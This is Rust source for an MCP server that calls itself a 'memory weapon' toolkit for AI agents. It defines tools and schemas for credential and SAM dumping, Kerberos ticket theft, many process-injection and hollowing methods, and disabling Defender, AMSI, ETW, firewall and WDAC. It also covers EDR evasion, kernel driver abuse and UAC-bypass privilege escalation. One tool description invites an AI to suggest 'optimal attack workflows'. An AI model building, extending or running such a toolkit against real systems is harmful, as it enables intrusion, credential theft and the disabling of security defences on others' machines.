//! MCP Tools - Consolidated memory weapon toolkit
//!
//! memoric is a specialized memory weapon MCP server.
//! All tools consolidated into 12 core commands for maximum efficiency.

use serde_json::{json, Value};

fn parse_u64_arg(value: Option<&Value>) -> Option<u64> {
    value.and_then(|v| {
        v.as_u64()
            .or_else(|| v.as_i64().filter(|n| *n >= 0).map(|n| n as u64))
            .or_else(|| {
                v.as_str().and_then(|s| {
                    let trimmed = s.trim();
                    let normalized = trimmed
                        .strip_prefix("0x")
                        .or_else(|| trimmed.strip_prefix("0X"))
                        .unwrap_or(trimmed);

                    u64::from_str_radix(normalized, 16)
                        .ok()
                        .or_else(|| normalized.parse::<u64>().ok())
                })
            })
    })
}

const TARGET_ACTIONS: &str = "ps_list, ps_find, ps_info, modules, threads, threads_list, thread_suspend, thread_resume, thread_context, handles, env, cmdline, windows, peb, module_base, mem_find, string_read, string_write, callstack, heap, cred_dump, sam_dump, kerberos_tickets";
const MEMORY_ACTIONS: &str = "read, write, write_string, scan, query, query_find, alloc, free, protect, scan_new, scan_next, scan_undo, scan_list, scan_reset, scan_freeze";
const MEMORY_READ_MODES: &str = "raw, string, stealth, scattered, physical";
const MEMORY_SCAN_MODES: &str = "exact, changed, pattern, stealth_pattern, range, delta, string, unknown, pointer, aob, aligned, multi";
const INJECT_ACTIONS: &str = "shellcode, dll, spawn, hijack_enum, hijack_backup, hijack_redirect, hijack_restore, hijack_wait, create_remote_thread, nt_create_thread, fiber, threadpool, stack_bomb, pool_party_worker, pool_party_work, pool_party_direct, pool_party_timer, export_forward, phantom_hollow, transacted_hollow, wow64_detect";
const INJECT_SHELLCODE_METHODS: &str = "thread, apc, special_apc, mapping, mockingjay, atom, callback_enum, propagate, instrumentation, kernel_callback, wow64, heaven_gate, stomp, threadless, workitem, pool_party";
const INJECT_DLL_METHODS: &str = "classic, manual_map, phantom, reflective";
const INJECT_SPAWN_METHODS: &str = "hollow, ghost, doppelgang, herpaderp, early_bird, transacted";
const PAYLOAD_ACTIONS: &str = "pe_parse, obfuscate, wait, exit_code, cleanup, serialize";
const PAYLOAD_SHOW_OPTIONS: &str = "headers, imports, exports, sections, iat_entry";
const PAYLOAD_OBF_METHODS: &str =
    "xor, rc4, aes_ctr, polymorphic, uuid, ipv4, mac, transform, strings";
const HOOK_ACTIONS: &str = "hook_function, install, install_iat, remove, remove_iat, install_hwbp, remove_hwbp, trampoline, detour, restore, winhook, hwbp_syscall";
const HOOK_METHODS: &str = "iat, inline";
const STEALTH_ACTIONS: &str = "patch_etw, patch_amsi, patch_cfg, patch_cig, unhook_ntdll, unhook_function, hide_module, fluctuate_module, module_stomp, sleep_ekko, sleep_foliage, sleep_gargoyle, sleep_death, spoof_callstack, spoof_ppid, spoof_return, deep_stack_spoof, syscall_write, syscall_alloc, syscall_protect, syscall_thread, syscall_open, syscall_read, syscall_query, syscall_close, syscall_free, syscall_stealth_read, syscall_inject, encrypt_memory, decrypt_memory, mutate_code, sysmon_blind, timestomp, etw_provider_disable, etw_mass_disable, create_suspended, testsign_hide_ntquery, testsign_hide_self, testsign_hide_bcd, testsign_query, testsign_auto_inject, testsign_launch_hooked, testsign_kernel_bypass, testsign_launch_clean, testsign_ci_callback, testsign_ci_func_patch, testsign_pte_rw, wdac_disable, wdac_restore, defender_disable, defender_restore, defender_status, defender_add_exclusion, defender_mpcmdrun, firewall_add_rule, firewall_remove_rule, firewall_list_rules, firewall_disable, firewall_enable, firewall_status, sentinel_start, sentinel_stop, sentinel_status, sentinel_self_destruct, callback_enum_by_driver, callback_masquerade, etw_ti_selective_disable, minifilter_enum_classified, minifilter_selective_detach, minifilter_pause, minifilter_resume";
const STEALTH_SYSCALL_METHODS: &str = "indirect, direct, int2e";
const DETECT_ACTIONS: &str = "edr_products, edr_hooks, edr_quick_check, edr_suspend, etw_sessions, veh_chain, vm_sandbox, hypervisor, forensics, integrity, hooks, hook_function, syscall_resolve, stealth_score, bypass_recommendations";
const PRIVILEGE_ACTIONS: &str = "elevate, token_steal, token_impersonate, token_revert, token_scan, debug_priv, check, potato, service_unquoted, service_weak_perms, service_always_elevated, symlink";
const PRIVILEGE_ELEVATE_METHODS: &str = "auto, fodhelper, eventvwr, computerdefaults, sdclt, disk_cleanup, mock_trusted_dir, request_uac, system";
const PRIVILEGE_POTATO_METHODS: &str = "print_spoofer, god_potato, efs_potato";
const SELF_ACTIONS: &str = "peb, heap, test, status, protect_init, protect_encrypt, protect_decrypt, protect_wipe, info, version, anti_debug, state";
const ORCHESTRATE_ACTIONS: &str = "assess, execute, plan, templates, status";

pub(crate) fn is_known_tool_action(tool: &str, action: &str) -> bool {
    let actions = match tool {
        "target" => TARGET_ACTIONS,
        "memory" => MEMORY_ACTIONS,
        "inject" => INJECT_ACTIONS,
        "payload" => PAYLOAD_ACTIONS,
        "hook" => HOOK_ACTIONS,
        "stealth" => STEALTH_ACTIONS,
        "detect" => DETECT_ACTIONS,
        "privilege" => PRIVILEGE_ACTIONS,
        "self" => SELF_ACTIONS,
        "orchestrate" => ORCHESTRATE_ACTIONS,
        "kernel" => return true,
        "memoric" => return true,
        _ => return false,
    };

    actions.split(", ").any(|candidate| candidate == action)
}

fn require_action<'a>(args: &'a Value, tool: &str, available: &str) -> Result<&'a str, String> {
    args.get("action").and_then(|v| v.as_str()).ok_or_else(|| {
        format!(
            "{} requires 'action'. Available actions: {}. Call `memoric` with domain='{}' for current usage.",
            tool, available, tool
        )
    })
}

fn unknown_action_error(tool: &str, action: &str, available: &str) -> String {
    format!(
        "Unknown {} action: {}. Available: {}. Call `memoric` with domain='{}' for examples.",
        tool, action, available, tool
    )
}

fn invalid_choice_error(
    tool: &str,
    action: &str,
    field: &str,
    value: &str,
    allowed: &str,
) -> String {
    format!(
        "Invalid {} for {}(action='{}'): {}. Allowed: {}.",
        field, tool, action, value, allowed
    )
}

fn missing_param_error(tool: &str, action: &str, param: &str, hint: Option<&str>) -> String {
    match hint {
        Some(hint) => format!(
            "{}(action='{}') requires '{}'. {}",
            tool, action, param, hint
        ),
        None => format!("{}(action='{}') requires '{}'.", tool, action, param),
    }
}

fn invalid_param_error(tool: &str, action: &str, param: &str, detail: &str) -> String {
    format!(
        "{}(action='{}') invalid '{}': {}.",
        tool, action, param, detail
    )
}

fn require_u64_param(args: &Value, key: &str, tool: &str, action: &str) -> Result<u64, String> {
    parse_u64_arg(args.get(key)).ok_or_else(|| missing_param_error(tool, action, key, None))
}

fn require_nonzero_usize_param(
    args: &Value,
    key: &str,
    tool: &str,
    action: &str,
) -> Result<usize, String> {
    let value = require_u64_param(args, key, tool, action)?;
    if value == 0 {
        return Err(invalid_param_error(
            tool,
            action,
            key,
            "expected a non-zero value",
        ));
    }

    usize::try_from(value)
        .map_err(|_| invalid_param_error(tool, action, key, "value is too large for this platform"))
}

fn require_str_param<'a>(
    args: &'a Value,
    key: &str,
    tool: &str,
    action: &str,
    hint: Option<&str>,
) -> Result<&'a str, String> {
    args.get(key)
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty())
        .ok_or_else(|| missing_param_error(tool, action, key, hint))
}

fn normalize_alias(args: &Value, canonical: &str, alias: &str, tool: &str, action: &str) -> Value {
    if args.get(canonical).is_some() || args.get(alias).is_none() {
        return args.clone();
    }

    tracing::warn!(
        "{}(action='{}', {}=...) is deprecated, use {} instead",
        tool,
        action,
        alias,
        canonical
    );

    let mut normalized = args.clone();
    if let Some(value) = args.get(alias) {
        normalized
            .as_object_mut()
            .map(|m| m.insert(canonical.to_string(), value.clone()));
    }
    normalized
}

fn normalize_protection_value(protect: &str) -> Option<u32> {
    match protect {
        "RWX" | "PAGE_EXECUTE_READWRITE" => Some(0x40),
        "RW" | "PAGE_READWRITE" => Some(0x04),
        "RX" | "PAGE_EXECUTE_READ" => Some(0x20),
        "R" | "PAGE_READONLY" => Some(0x02),
        "NOACCESS" | "PAGE_NOACCESS" => Some(0x01),
        _ => None,
    }
}

fn normalize_common_args(tool: &str, args: &Value) -> Value {
    let action = args
        .get("action")
        .and_then(|v| v.as_str())
        .unwrap_or_default();
    let mut normalized = args.clone();

    match tool {
        "target" => match action {
            "module_base" => {
                normalized = normalize_alias(&normalized, "module_name", "module", tool, action);
            }
            "string_read" | "string_write" | "mem_find" => {
                normalized = normalize_alias(&normalized, "address", "base_address", tool, action);
            }
            _ => {}
        },
        "memory" => {
            normalized = normalize_alias(&normalized, "address", "base_address", tool, action);
            normalized = normalize_alias(&normalized, "size", "length", tool, action);
            normalized = normalize_alias(&normalized, "bytes", "data", tool, action);
            if matches!(action, "scan" | "scan_new") {
                normalized =
                    normalize_alias(&normalized, "signature", "pattern_bytes", tool, action);
            }
        }
        "payload" => {
            if action == "pe_parse" {
                normalized = normalize_alias(&normalized, "module", "module_name", tool, action);
            }
        }
        "hook" => {
            normalized = normalize_alias(&normalized, "function", "target_function", tool, action);
            normalized = normalize_alias(
                &normalized,
                "iat_address",
                "iat_entry_address",
                tool,
                action,
            );
            normalized = normalize_alias(
                &normalized,
                "original_address",
                "original_value",
                tool,
                action,
            );
            normalized =
                normalize_alias(&normalized, "hook_address", "detour_address", tool, action);
        }
        "stealth" => {
            normalized = normalize_alias(&normalized, "address", "base_address", tool, action);
            normalized = normalize_alias(&normalized, "size", "length", tool, action);
            normalized = normalize_alias(
                &normalized,
                "shellcode_address",
                "shellcode_addr",
                tool,
                action,
            );
            if matches!(
                action,
                "sleep_ekko" | "sleep_foliage" | "sleep_gargoyle" | "sleep_death"
            ) {
                normalized = normalize_alias(&normalized, "sleep_ms", "delay_ms", tool, action);
            }
            if matches!(action, "syscall_alloc" | "syscall_protect")
                && normalized.get("protection").is_none()
            {
                if let Some(protect) = normalized.get("protect").and_then(|v| v.as_str()) {
                    if let Some(protection) = normalize_protection_value(protect) {
                        if let Some(obj) = normalized.as_object_mut() {
                            obj.insert("protection".to_string(), json!(protection));
                        }
                    }
                }
            }
        }
        "inject" => {
            normalized = normalize_alias(&normalized, "start_address", "address", tool, action);
            normalized = normalize_alias(
                &normalized,
                "shellcode_addr",
                "shellcode_address",
                tool,
                action,
            );
            normalized = normalize_alias(&normalized, "target_path", "target_exe", tool, action);
        }
        _ => {}
    }

    normalized
}

fn classify_tool_error(message: &str) -> (&'static str, &'static str) {
    let lower = message.to_lowercase();

    if lower.contains("requires") || lower.contains("missing ") {
        (
            "missing_param",
            "Provide the required parameter shown in the error message.",
        )
    } else if lower.contains("invalid ") || lower.contains("invalid_") {
        (
            "invalid_param",
            "Check the parameter type, range, and accepted enum values.",
        )
    } else if lower.contains("0x8007012b")
        || lower.contains("partial copy")
        || lower.contains("299")
    {
        ("partial_copy", "The requested span crosses unreadable or incompatible memory. Query regions first, then read a committed readable range or use a smaller size.")
    } else if lower.contains("0x80070005")
        || lower.contains("access is denied")
        || lower.contains("permission denied")
    {
        ("access_denied", "Run elevated, confirm UAC approval, enable SeDebugPrivilege where applicable, and avoid protected/system processes unless authorized.")
    } else if lower.contains("0x80070057") || lower.contains("invalid parameter") {
        ("invalid_target", "Verify the PID, thread ID, handle, or address still exists and belongs to the expected process.")
    } else if lower.contains("0x8007006d") || lower.contains("pipe") || lower.contains("broken") {
        ("ipc_closed", "The worker or service pipe closed unexpectedly. Reconnect the MCP session after checking whether the previous action terminated the worker.")
    } else if lower.contains("0xc000010a")
        || lower.contains("terminated")
        || lower.contains("process is terminating")
    {
        ("process_terminating", "The target process is exiting. Wait for a fresh target process and retry after it is initialized.")
    } else if lower.contains("not found") {
        ("not_found", "Verify the target process/module/function/session exists and retry after readiness checks if needed.")
    } else {
        (
            "tool_error",
            "Inspect the context fields and retry with narrower parameters.",
        )
    }
}

pub fn tool_error_payload(tool: &str, args: &Value, message: &str) -> Value {
    let normalized_args = normalize_common_args(tool, args);
    let args = &normalized_args;
    let action = args
        .get("action")
        .and_then(|v| v.as_str())
        .unwrap_or_default();
    let (code, hint) = classify_tool_error(message);
    let mut context = serde_json::Map::new();

    context.insert("tool".to_string(), json!(tool));
    if !action.is_empty() {
        context.insert("action".to_string(), json!(action));
    }
    for key in [
        "pid",
        "tid",
        "session_id",
        "module",
        "module_name",
        "function",
    ] {
        if let Some(value) = args.get(key) {
            context.insert(key.to_string(), value.clone());
        }
    }
    if let Some(address) = parse_u64_arg(args.get("address")) {
        context.insert("address".to_string(), json!(format!("0x{:016X}", address)));
    }
    if let Some(size) = parse_u64_arg(args.get("size")) {
        context.insert("size".to_string(), json!(size));
    }

    json!({
        "success": false,
        "code": code,
        "error": message,
        "hint": hint,
        "context": context,
    })
}

pub fn tool_error_text(tool: &str, args: &Value, message: &str) -> String {
    serde_json::to_string(&tool_error_payload(tool, args, message)).unwrap_or_else(|_| {
        format!(
            "{{\"success\":false,\"code\":\"tool_error\",\"error\":\"{}\"}}",
            message.replace('"', "'")
        )
    })
}

fn normalize_kernel_args(args: &Value) -> Value {
    let mut normalized = args.clone();

    if let Some(action) = normalized.get("action").and_then(|v| v.as_str()) {
        let canonical_action = match action {
            "notify_routine" => Some("driver_notify_routine"),
            "reg_protect" => Some("driver_reg_protect"),
            "object_hook" => Some("driver_object_hook"),
            "port_hide" => Some("driver_port_hide"),
            _ => None,
        };

        if let Some(canonical) = canonical_action {
            tracing::warn!(
                "kernel(action='{}') is deprecated, use action='{}' instead",
                action,
                canonical
            );
            normalized
                .as_object_mut()
                .map(|m| m.insert("action".to_string(), json!(canonical)));
        }
    }

    let action = normalized
        .get("action")
        .and_then(|v| v.as_str())
        .unwrap_or_default();

    normalized = match action {
        "write" | "physical_write" => {
            normalize_alias(&normalized, "bytes", "data", "kernel", action)
        }
        "ppl_bypass" | "dkom_hide" | "token_escalate" => {
            normalize_alias(&normalized, "pid", "target_pid", "kernel", action)
        }
        "driver_notify_routine" => {
            let normalized = normalize_alias(
                &normalized,
                "notify_type",
                "callback_type",
                "kernel",
                action,
            );
            normalize_alias(
                &normalized,
                "notify_action",
                "callback_action",
                "kernel",
                action,
            )
        }
        "driver_reg_protect" => {
            let normalized = normalize_alias(
                &normalized,
                "reg_action",
                "registry_action",
                "kernel",
                action,
            );
            normalize_alias(&normalized, "reg_flags", "registry_flags", "kernel", action)
        }
        "driver_object_hook" => {
            let normalized =
                normalize_alias(&normalized, "protect_pid", "target_pid", "kernel", action);
            let normalized = normalize_alias(&normalized, "protect_pid", "pid", "kernel", action);
            let normalized =
                normalize_alias(&normalized, "strip_access", "access_mask", "kernel", action);
            normalize_alias(&normalized, "obj_action", "object_action", "kernel", action)
        }
        "driver_port_hide" => {
            let normalized =
                normalize_alias(&normalized, "port_action", "hide_action", "kernel", action);
            normalize_alias(&normalized, "protocol", "proto", "kernel", action)
        }
        "driver_global_hook" => {
            let normalized =
                normalize_alias(&normalized, "target_module", "module", "kernel", action);
            let normalized =
                normalize_alias(&normalized, "target_function", "function", "kernel", action);
            normalize_alias(
                &normalized,
                "replacement_addr",
                "hook_address",
                "kernel",
                action,
            )
        }
        "driver_auto_inject" => {
            let normalized = normalize_alias(
                &normalized,
                "inject_action",
                "auto_action",
                "kernel",
                action,
            );
            normalize_alias(
                &normalized,
                "process_filter",
                "target_process",
                "kernel",
                action,
            )
        }
        "driver_wfp_remove" => {
            normalize_alias(&normalized, "provider_name", "provider", "kernel", action)
        }
        "driver_kernel_apc" => normalize_alias(&normalized, "tid", "thread_id", "kernel", action),
        _ => normalized,
    };

    normalized
}

fn is_hybrid_kernel_action(action: &str) -> bool {
    matches!(action, "ppl_bypass" | "dkom_hide" | "token_escalate")
}

fn is_memoric_direct_kernel_action(action: &str) -> bool {
    action.starts_with("driver_")
        && !matches!(
            action,
            "driver_load" | "driver_unload" | "driver_discover" | "driver_auto"
        )
}

fn annotate_kernel_result(
    mut result: Value,
    action: &str,
    args: &Value,
    memoric_available_before: bool,
) -> Value {
    let Some(obj) = result.as_object_mut() else {
        return result;
    };

    if is_hybrid_kernel_action(action) {
        let explicit_byovd = args
            .get("device_path")
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty())
            .is_some();

        obj.entry("driver_source".to_string())
            .or_insert(json!(if explicit_byovd { "byovd" } else { "memoric" }));
        obj.entry("driver_auto_installed".to_string())
            .or_insert(json!(!explicit_byovd && !memoric_available_before));
        obj.entry("fallback_used".to_string())
            .or_insert(json!(false));
        obj.entry("memoric_preferred".to_string())
            .or_insert(json!(true));
    } else if is_memoric_direct_kernel_action(action) {
        obj.entry("driver_source".to_string())
            .or_insert(json!("memoric"));
        obj.entry("driver_auto_installed".to_string())
            .or_insert(json!(!memoric_available_before));
        obj.entry("fallback_used".to_string())
            .or_insert(json!(false));
        obj.entry("memoric_preferred".to_string())
            .or_insert(json!(true));
    }

    result
}

fn memoric_driver_status_json() -> Value {
    let available_before = crate::driver::MemoricDriver::is_available();

    match crate::driver::MemoricDriver::ensure() {
        Ok(drv) => match drv.driver_stats() {
            Ok(stats) => json!({
                "loaded": true,
                "version": stats.driver_version,
                "total_ioctls": stats.total_ioctls,
                "driver_source": "memoric",
                "driver_auto_installed": !available_before,
                "fallback_used": false,
            }),
            Err(_) => json!({
                "loaded": true,
                "stats": "unavailable",
                "driver_source": "memoric",
                "driver_auto_installed": !available_before,
                "fallback_used": false,
            }),
        },
        Err(_) => json!({
            "loaded": false,
            "driver_source": "memoric",
            "driver_auto_installed": false,
            "fallback_used": false,
        }),
    }
}

fn memoric_driver_readiness_json() -> Value {
    let loaded = crate::driver::MemoricDriver::is_available();
    json!({
        "loaded": loaded,
        "device_path": "\\\\.\\Memoric",
        "probe_only": true,
        "driver_auto_installed": false,
        "fallback_used": false,
        "message": if loaded {
            "memoric.sys device is reachable"
        } else {
            "memoric.sys device is not reachable; kernel-backed actions need explicit driver setup"
        }
    })
}

fn process_exists_by_snapshot(pid: u32) -> bool {
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };

    unsafe {
        let Ok(snapshot) = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) else {
            return false;
        };
        let snapshot = crate::safe_handle::SafeHandle::new(snapshot);
        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };

        if Process32FirstW(*snapshot, &mut entry).is_err() {
            return false;
        }

        loop {
            if entry.th32ProcessID == pid {
                return true;
            }
            if Process32NextW(*snapshot, &mut entry).is_err() {
                return false;
            }
        }
    }
}

fn target_readiness_json(target_pid: Option<u64>) -> Value {
    use windows::Win32::Foundation::BOOL;
    use windows::Win32::System::Threading::{
        IsWow64Process, OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION,
    };

    let Some(pid64) = target_pid else {
        return json!({
            "provided": false,
            "ready": false,
            "hint": "Provide pid for target-specific readiness checks"
        });
    };

    let Ok(pid) = u32::try_from(pid64) else {
        return json!({
            "provided": true,
            "ready": false,
            "pid": pid64,
            "error": "pid is outside the supported u32 range"
        });
    };

    let exists = process_exists_by_snapshot(pid);

    unsafe {
        match OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid) {
            Ok(handle) => {
                let handle = crate::safe_handle::SafeHandle::new(handle);

                #[cfg(target_arch = "x86_64")]
                let arch = {
                    let mut is_wow64 = BOOL::default();
                    if IsWow64Process(*handle, &mut is_wow64).is_ok() {
                        if is_wow64.0 != 0 {
                            "x86 (WoW64)"
                        } else {
                            "x64"
                        }
                    } else {
                        "unknown"
                    }
                };

                #[cfg(target_arch = "x86")]
                let arch = "x86";

                json!({
                    "provided": true,
                    "ready": true,
                    "pid": pid,
                    "exists": exists,
                    "query_limited_openable": true,
                    "target_arch": arch,
                    "server_arch": std::env::consts::ARCH,
                })
            }
            Err(err) => json!({
                "provided": true,
                "ready": false,
                "pid": pid,
                "exists": exists,
                "query_limited_openable": false,
                "error": err.to_string(),
                "hint": if exists {
                    "Target exists but limited query access failed; confirm elevation/UAC and target protection state"
                } else {
                    "Target PID was not found in the process snapshot"
                }
            }),
        }
    }
}

fn runtime_readiness_json(args: &Value) -> Value {
    let admin = crate::privilege::uac::is_admin()
        .unwrap_or_else(|e| json!({"is_admin": false, "error": e.to_string()}));
    let uac = crate::privilege::check_uac_status(&json!({}))
        .unwrap_or_else(|e| json!({"error": e.to_string()}));

    json!({
        "server": {
            "pid": std::process::id(),
            "arch": std::env::consts::ARCH,
            "os": std::env::consts::OS,
            "version": env!("CARGO_PKG_VERSION"),
        },
        "privilege": {
            "admin": admin,
            "uac": uac,
        },
        "driver": memoric_driver_readiness_json(),
        "target": target_readiness_json(parse_u64_arg(args.get("pid"))),
    })
}

/// Register all consolidated tools
pub fn register_tools() -> Vec<Value> {
    vec![
        // ═══════════════════════════════════════════════════════════════════
        // 1. GUIDE - Entry point & navigation
        // ═══════════════════════════════════════════════════════════════════
        json!({
            "name": "memoric",
            "description": "CALL THIS FIRST. Memory weapon guide & workflow assistant. Returns available capabilities, suggests optimal attack workflows, and shows current session status.",
            "inputSchema": {
                "type": "object",
                "properties": {
                    "domain": {
                        "type": "string",
                        "enum": ["target", "memory", "inject", "payload", "hook", "stealth", "detect", "privilege", "kernel", "self", "orchestrate", "all"],
                        "description": "Show detailed help for a specific domain"
                    },
                    "goal": {
                        "type": "string",
                        "description": "Describe your objective for workflow suggestions (e.g. 'inject shellcode stealthily')"
                    },
                    "status": {
                        "type": "boolean",
                        "description": "Show current session state",
                        "default": false
                    }
                }
            }
        }),
        // ═══════════════════════════════════════════════════════════════════
        // 2. TARGET - Process/thread/module acquisition
        // ═══════════════════════════════════════════════════════════════════
        json!({
            "name": "target",
            "description": "[TARGET] Process/thread/module operations. List/find processes, enumerate threads, list loaded DLLs, suspend/resume threads, get thread context (RIP/RSP/RAX-R15).",
            "inputSchema": {
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["ps_list", "ps_find", "ps_info", "modules", "threads", "threads_list", "thread_suspend", "thread_resume", "thread_context", "handles", "env", "cmdline", "windows", "peb", "module_base", "mem_find", "string_read", "string_write", "callstack", "heap", "cred_dump", "sam_dump", "kerberos_tickets"],
                        "description": "ps_list=enumerate all, ps_find=search by name, ps_info=detailed process info, modules=list DLLs, threads/threads_list=list threads, thread_suspend/resume/context control thread execution and register access"
                    },
                    "pid": { "type": "integer", "description": "Process ID" },
                    "tid": { "type": "integer", "description": "Thread ID (for suspend/resume/context)" },
                    "name": { "type": "string", "description": "Process name pattern (for ps_find)" },
                    "module_name": { "type": "string", "description": "Module name for module_base lookup" },
                    "address": { "type": ["integer", "string"], "description": "Memory address for string_read/string_write" },
                    "text": { "type": "string", "description": "String payload for string_write" },
                    "max_len": { "type": "integer", "description": "Maximum length for string_read" },
                    "wait_ms": { "type": "integer", "description": "Optional readiness wait for actions such as windows" },
                    "suspend": { "type": "boolean", "default": true, "description": "Suspend thread while capturing context (for thread_context)" },
                    "output_path": { "type": "string", "description": "Optional dump path for cred_dump" },
                    "output_dir": { "type": "string", "description": "Output directory for sam_dump hive files" },
                    "dump_sam": { "type": "boolean", "description": "Dump SAM hive (default: true)" },
                    "dump_security": { "type": "boolean", "description": "Dump SECURITY hive (default: true)" },
                    "all_sessions": { "type": "boolean", "description": "Extract tickets from all logon sessions" },
                    "include_system": { "type": "boolean", "default": true },
                    "limit": { "type": "integer", "default": 100 },
                    "type_filter": { "type": "string", "description": "Handle type filter e.g. 'Process', 'Thread', 'File' (for handles)" },
                    "offset": { "type": "integer", "description": "Pagination offset (for handles)" }
                },
                "required": ["action"]
            }
        }),
        // ═══════════════════════════════════════════════════════════════════
        // 3. MEMORY - Core memory operations
        // ═══════════════════════════════════════════════════════════════════
        json!({
            "name": "memory",
            "description": "[MEMORY] Unified memory operations: read, write, scan, query regions, allocate, free, protect. Supports stealth mode (BYOVD), scattered reads with jitter, and physical memory access.",
            "inputSchema": {
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["read", "write", "write_string", "scan", "query", "query_find", "alloc", "free", "protect", "scan_new", "scan_next", "scan_undo", "scan_list", "scan_reset", "scan_freeze"],
                        "description": "Memory operation to perform. write_string/query_find are explicit AI-friendly aliases for string writes and filtered region lookups. scan_new/scan_next/scan_undo/scan_list/scan_reset/scan_freeze = Cheat Engine-style persistent scan workflow"
                    },
                    "pid": { "type": "integer", "description": "Target process ID" },
                    "address": { "type": ["integer", "string"], "description": "Memory address (int or hex string '0x1234')" },
                    "size": { "type": "integer", "description": "Size in bytes" },
                    "limit": { "type": "integer", "description": "Maximum number of results to return" },
                    "offset": { "type": "integer", "description": "Pagination offset for scan/query results" },
                    "mode": {
                        "type": "string",
                        "enum": ["raw", "string", "stealth", "scattered", "physical"],
                        "description": "read mode: raw=bytes, string=null-terminated, stealth=BYOVD driver, scattered=jitter delays, physical=physical memory"
                    },
                    "bytes": { "type": "array", "items": {"type": "integer"}, "description": "Bytes to write (for write)" },
                    "text": { "type": "string", "description": "Text to write (for write_string or legacy write(text=...))" },
                    "scan_mode": {
                        "type": "string",
                        "enum": ["exact", "changed", "pattern", "stealth_pattern", "range", "delta", "string", "unknown", "pointer", "aob", "aligned", "multi"],
                        "description": "scan mode: exact=value, changed=delta, pattern=IDA sig, range=min-max, delta=±change, string=ANSI/Unicode, unknown=initial, pointer=chain, aob=raw AOB, aligned=aligned scan, multi=multiple values"
                    },
                    "scan_type": { "type": "string", "enum": ["int", "float", "string", "bytes"], "description": "Scanner data type for exact/range scans" },
                    "value": { "description": "Value to scan for or freeze to" },
                    "values": { "type": "array", "items": {}, "description": "Array of values to scan for (multi mode)" },
                    "change": { "type": "string", "enum": ["changed", "unchanged", "increased", "decreased"], "description": "Change filter for legacy changed scans" },
                    "delta": { "type": "number", "description": "Delta amount for scan_mode='delta'" },
                    "direction": { "type": "string", "enum": ["increased_by", "decreased_by"], "description": "Direction for scan_mode='delta'" },
                    "min": { "type": "number", "description": "Minimum value (range mode)" },
                    "max": { "type": "number", "description": "Maximum value (range mode)" },
                    "alignment": { "type": "integer", "description": "Alignment in bytes, power of 2 (aligned mode, default 4)" },
                    "signature": { "type": "string", "description": "Byte signature e.g. '48 8B 05 ?? ?? ?? ??' (pattern/aob mode)" },
                    "pattern": { "type": "string", "description": "String pattern for scan_mode='string' or explicit pattern alias for signatures" },
                    "encoding": { "type": "string", "enum": ["ansi", "unicode", "both"], "description": "Encoding for scan_mode='string'" },
                    "case_insensitive": { "type": "boolean", "default": true, "description": "Case-insensitive matching for scan_mode='string'" },
                    "target_address": { "type": ["integer", "string"], "description": "Target address for pointer scans" },
                    "max_depth": { "type": "integer", "description": "Maximum pointer depth for pointer scans" },
                    "protect": { "type": "string", "enum": ["RWX", "RW", "RX", "R"], "description": "Protection level (for alloc/protect)" },
                    "filter": { "type": "string", "description": "Region filter: private/image/mapped/executable/readwrite (for query); OR scan_next filter: changed/unchanged/exact/increased/decreased" },
                    "bypass_protect": { "type": "boolean", "default": true, "description": "Auto bypass page protection for writes" },
                    "start_address": { "type": ["integer", "string"], "description": "Starting address for long-running scans" },
                    "timeout_secs": { "type": "integer", "description": "Time budget for scan operations" },
                    "exclude_mapped": { "type": "boolean", "description": "Skip MEM_MAPPED regions during scans" },
                    "exclude_image": { "type": "boolean", "description": "Skip MEM_IMAGE regions during scans" },
                    "module_name": { "type": "string", "description": "Restrict scan results to a named module" },
                    "session_id": { "type": "string", "description": "Scan session ID (for scan_next/scan_undo/scan_reset/scan_freeze)" },
                    "value_type": { "type": "string", "enum": ["u8", "u16", "u32", "u64", "i32", "i64", "f32", "f64", "bytes"], "description": "Value type for scan_new (default: u32)" }
                },
                "required": ["action"]
            }
        }),
        // ═══════════════════════════════════════════════════════════════════
        // 4. INJECT - Code injection & execution
        // ═══════════════════════════════════════════════════════════════════
        json!({
            "name": "inject",
            "description": "[INJECT] Unified code injection: 17+ methods including thread/APC/mapping/mockingjay/atom/callbacks/stomping/threadless/pool_party. Also supports process hollowing (ghost/doppelgang/herpaderp) and thread hijacking workflow.",
            "inputSchema": {
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": [
                            "shellcode", "dll", "spawn", "hijack_enum", "hijack_backup",
                            "hijack_redirect", "hijack_restore", "hijack_wait",
                            "create_remote_thread", "nt_create_thread",
                            "fiber", "threadpool", "stack_bomb",
                            "pool_party_worker", "pool_party_work", "pool_party_direct", "pool_party_timer",
                            "export_forward", "phantom_hollow", "transacted_hollow",
                            "wow64_detect"
                        ],
                        "description": "Injection action. Prefer spawn(target_path=...) over legacy target_exe, and use dll_path for DLL-based actions."
                    },
                    "pid": { "type": "integer", "description": "Target process ID" },
                    "tid": { "type": "integer", "description": "Thread ID (for APC/hijack)" },
                    "method": {
                        "type": "string",
                        "enum": [
                            "thread", "apc", "special_apc", "mapping", "mockingjay",
                            "atom", "callback_enum", "propagate", "instrumentation",
                            "kernel_callback", "wow64", "heaven_gate", "stomp",
                            "threadless", "workitem", "pool_party"
                        ],
                        "description": "Shellcode injection method"
                    },
                    "dll_method": {
                        "type": "string",
                        "enum": ["classic", "manual_map", "phantom", "reflective"],
                        "description": "DLL injection method"
                    },
                    "spawn_method": {
                        "type": "string",
                        "enum": ["hollow", "ghost", "doppelgang", "herpaderp", "early_bird", "transacted"],
                        "description": "Process spawn method"
                    },
                    "shellcode": { "type": "array", "items": {"type": "integer"}, "description": "Shellcode bytes" },
                    "dll_path": { "type": "string", "description": "Path to DLL (required for action='dll')" },
                    "target_path": { "type": "string", "description": "Executable path for spawn-based actions" },
                    "target_exe": { "type": "string", "description": "Legacy alias for target_path (still accepted)" },
                    "payload": { "type": "string", "description": "Payload path (for spawn)" },
                    "variant": { "type": "integer", "default": 1, "description": "Pool Party variant 1-8" },
